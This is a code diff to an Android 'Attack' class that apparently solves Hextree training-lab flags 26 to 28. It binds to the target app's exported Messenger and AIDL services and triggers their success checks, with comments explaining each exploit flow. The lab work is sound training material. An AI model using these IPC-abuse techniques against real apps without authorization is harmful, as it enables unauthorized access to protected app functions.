@@ -473,21 +473,17 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 	}
 
 	/**
-	 * FLAG 27 - Message Replies
-	 * Technique: Messenger challenge-response (echo -> password -> submit)
+	 * FLAG 26 - Basic Message Handler
+	 * Technique: One-way Messenger call matching a hardcoded `what` code
 	 *
 	 * Flow:
-	 * 1. Send MSG_ECHO with "echo"="give flag" - sets server-side state, no reply
-	 * 2. Send MSG_GET_PASSWORD with a non-null Parcelable obj + our replyTo -
-	 *    server generates a random password and mails it back through replyTo
-	 * 3. Our handler receives it, builds MSG_GET_FLAG with that password and its
-	 *    own throwaway replyTo, sends it back on the same serviceMessenger
-	 * 4. echo=="give flag" && password matches -> success() -> Flag27Activity shown
+	 * 1. Bind to Flag26Service, wrap the returned IBinder as a Messenger
+	 * 2. Send a single Message with what = 42 - no data, no obj, no replyTo
+	 * 3. handleMessage() checks message.what == 42 -> calls success() directly
 	 *
-	 * Key insight: Message.obj must be a real Parcelable (not a bare Any()) to
-	 * survive cross-process marshalling, and every outgoing message needs its own
-	 * non-null replyTo - the server's sendReply() helper fires on every branch,
-	 * success or failure, and NPEs the whole service if replyTo is missing.
+	 * Key insight: no challenge-response, no Parcelable obj requirement, no
+	 * reply needed - the entire check is one hardcoded int on the `what` field.
+	 * The simplest possible Messenger-based flag, unlike 27's multi-step version.
 	 */
 	fun flag26() {
 		val servicePath = "$packageName.services.Flag26Service"
@@ -497,12 +493,54 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		context.bindService(intent, Flag26Service.serviceConnection, Context.BIND_AUTO_CREATE)
 	}
 
+	/**
+	 * FLAG 27 - Message Replies
+	 * Technique: Messenger challenge-response (echo -> password -> submit)
+	 *
+	 * Flow:
+	 * 1. Send MSG_ECHO with "echo"="give flag" - sets server-side state, no reply
+	 * 2. Send MSG_GET_PASSWORD with a non-null Parcelable obj + our replyTo -
+	 *    server generates a random password and mails it back through replyTo
+	 * 3. Our handler receives it, builds MSG_GET_FLAG with that password and its
+	 *    own replyTo, sends it back on the same mainMessenger
+	 * 4. echo=="give flag" && password matches -> success() -> Flag27Activity shown
+	 *
+	 * Key insight: Message.obj must be a real Parcelable (not a bare Any()) to
+	 * survive cross-process marshalling, and every outgoing message needs its own
+	 * non-null replyTo - the server's sendReply() helper fires on every branch,
+	 * success or failure, and NPEs the whole service if replyTo is missing.
+	 */
 	fun flag27() {
 		val servicePath = "$packageName.services.Flag27Service"
 		val intent = Intent().apply {
 			setClassName(packageName, servicePath)
 		}
 		context.bindService(intent, Flag27Service.serviceConnection, Context.BIND_AUTO_CREATE)
+	}
+
+	/**
+	 * FLAG 28 - Basic AIDL Service
+	 * Technique: AIDL Stub/Proxy, recreated via a matching .aidl file
+	 *
+	 * Flow:
+	 * 1. Our .aidl file declares the same package + interface + method as the
+	 *    real IFlag28Interface, so our generated Proxy's DESCRIPTOR matches
+	 * 2. IFlag28Interface.Stub.asInterface(service) wraps the real cross-process
+	 *    Binder into a typed Proxy
+	 * 3. Calling openFlag() marshals transaction code 1 across to the real Stub
+	 * 4. Server-side openFlag() calls its own success() -> launches Flag28Activity
+	 *    with its own secret, which always matches itself
+	 *
+	 * Key insight: no password, no state machine - just correctly calling a
+	 * cross-process method is the whole exploit. The real risk here isn't logic,
+	 * it's package/method-order mismatch breaking the Binder transaction itself.
+	 */
+	fun flag28() {
+		val servicePath = "$packageName.services.Flag28Service"
+		val intent = Intent().apply {
+			setClassName(packageName, servicePath)
+		}
+		context.bindService(intent, Flag28Service.serviceConnection, Context.BIND_AUTO_CREATE)
 	}
 
 // ------------------- Content Providers Flags ------------------------//
